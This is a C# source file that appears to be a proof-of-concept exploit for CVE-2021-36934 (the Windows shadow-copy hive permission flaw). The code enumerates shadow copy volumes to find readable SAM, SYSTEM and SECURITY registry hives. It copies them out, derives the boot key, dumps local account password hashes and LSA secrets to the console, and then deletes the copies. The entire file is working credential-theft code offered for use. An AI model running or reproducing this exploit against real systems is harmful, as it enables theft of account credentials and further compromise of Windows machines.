using CVE_2021_36934.HiveParser;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using static CVE_2021_36934.HiveParser.Registry;

namespace CVE_2021_36934
{
    internal class Program
    {
        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Int32 _wfopen_s(out IntPtr pFile, String filename, String mode);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
        public static extern Int32 fclose(IntPtr stream);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CopyFileEx(string lpExistingFileName, string lpNewFileName,
            CopyProgressRoutine lpProgressRoutine, IntPtr lpData, ref Int32 pbCancel,
            CopyFileFlags dwCopyFlags);

        private delegate CopyProgressResult CopyProgressRoutine(
            long TotalFileSize,
            long TotalBytesTransferred,
            long StreamSize,
            long StreamBytesTransferred,
            uint dwStreamNumber,
            CopyProgressCallbackReason dwCallbackReason,
            IntPtr hSourceFile,
            IntPtr hDestinationFile,
            IntPtr lpData);

        internal enum CopyProgressResult : uint
        {
            PROGRESS_CONTINUE = 0,
            PROGRESS_CANCEL = 1,
            PROGRESS_STOP = 2,
            PROGRESS_QUIET = 3
        }

        private enum CopyProgressCallbackReason : uint
        {
            CALLBACK_CHUNK_FINISHED = 0x00000000,
            CALLBACK_STREAM_SWITCH = 0x00000001
        }

        [Flags]
        private enum CopyFileFlags : uint
        {
            COPY_FILE_FAIL_IF_EXISTS = 0x00000001,
            COPY_FILE_RESTARTABLE = 0x00000002,
            COPY_FILE_OPEN_SOURCE_FOR_WRITE = 0x00000004,
            COPY_FILE_ALLOW_DECRYPTED_DESTINATION = 0x00000008
        }

        private static void Main(string[] args)
        {
            int counter = 30;
            string path = "";
            string Tpath = "";

            if (args.Length == 1)
            {
                counter = Convert.ToInt32(args[0]);
            }
            else if (args.Length == 2)
            {
                Tpath = args[1];

            }
            else
            {
                Console.WriteLine("[-] Param error");
                Environment.Exit(1);

            }


            for (int i = 0; i <= counter; i++)
            {
                path = $@"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{i}\Windows\system32\config";
                if (CheckFile(path))
                {
                    break;
                }

                if (i == counter)
                {
                    Console.WriteLine("[-] Could not find any vulnerable shadow volume");
                    Environment.Exit(1);
                }
            }

            string sam = path + "\\sam";
            string system = path + "\\system";
            string security = path + "\\security";
            Console.WriteLine($"[*] SAM: {sam}");
            Console.WriteLine($"[*] SYSTEM: {system}");
            Console.WriteLine($"[*] SECURITY: {security}");

            string Tsam = Tpath + "\\" + GetRandomString(6,false,false,true,false,"");
            string Tsystem = Tpath + "\\" + GetRandomString(6, false, false, true, false, "");
            string Tsecurity = Tpath + "\\" + GetRandomString(6, false, false, true, false, "");
            Console.WriteLine($"[*] SAM: {Tsam}");
            Console.WriteLine($"[*] SYSTEM: {Tsystem}");
            Console.WriteLine($"[*] SECURITY: {Tsecurity}");


            Console.WriteLine(@"[*] Copying files to C:\windows\temp\");
            XCopy(sam, Tsam);
            XCopy(system, Tsystem);
            XCopy(security, Tsecurity);
            ParseSecrets(Tsam, Tsystem, Tsecurity);
            Console.WriteLine("[*] Cleaning up..");
            File.Delete(Tsam);
            File.Delete(Tsystem);
            File.Delete(Tsecurity);
        }

        private static void XCopy(string oldFile, string newFile)
        {
            int pbCancel = 0;
            CopyFileEx(oldFile, newFile, new CopyProgressRoutine(CopyProgressHandler), IntPtr.Zero, ref pbCancel, CopyFileFlags.COPY_FILE_RESTARTABLE);
        }

        private static CopyProgressResult CopyProgressHandler(long total, long transferred, long streamSize, long StreamByteTrans, uint dwStreamNumber, CopyProgressCallbackReason reason, IntPtr hSourceFile, IntPtr hDestinationFile, IntPtr lpData)
        {
            return CopyProgressResult.PROGRESS_CONTINUE;
        }

        public static bool CheckFile(string path)
        {
            IntPtr file;
            if (_wfopen_s(out file, path + "\\sam", "r") == 0)
            {
                fclose(file);
                return true;
            }
            else
            {
                fclose(file);
                return false;
            }
        }

        public static void ParseSecrets(string sampath, string systempath, string securitypath)
        {
            StringBuilder sb = new StringBuilder();
            byte[] bootKey = new byte[16];

            RegistryHive system = RegistryHive.ImportHiveDump(systempath);
            if (system != null)
            {
                bootKey = GetBootKey(system);
                if (bootKey == null)
                {
                    sb.AppendLine("[-] Failed to parse bootkey");
                    return;
                }
            }
            else
            {
                sb.AppendLine("[-] Unable to access to SYSTEM dump file");
            }

            RegistryHive sam = RegistryHive.ImportHiveDump(sampath);
            if (sam != null)
            {
                ParseSam(bootKey, sam).ForEach(item => sb.Append(item + Environment.NewLine));
            }
            else
            {
                sb.AppendLine("[-] Unable to access to SAM dump file");
            }

            RegistryHive security = RegistryHive.ImportHiveDump(securitypath);
            if (security != null)
            {
                ParseLsa(security, bootKey, system).ForEach(item => sb.Append(item + Environment.NewLine));
            }
            else
            {
                sb.AppendLine("[-] Unable to access to SECURITY dump file");
            }

            Console.WriteLine(sb.ToString());
        }
        public static string GetRandomString(int length, bool useNum, bool useLow, bool useUpp, bool useSpe, string custom)
        {
            byte[] b = new byte[4];
            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
            Random r = new Random(BitConverter.ToInt32(b, 0));
            string s = null, str = custom;
            if (useNum == true) { str += "0123456789"; }
            if (useLow == true) { str += "abcdefghijklmnopqrstuvwxyz"; }
            if (useUpp == true) { str += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; }
            if (useSpe == true) { str += "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"; }
            for (int i = 0; i < length; i++)
            {
                s += str.Substring(r.Next(0, str.Length - 1), 1);
            }
            return s;
        }
    }
}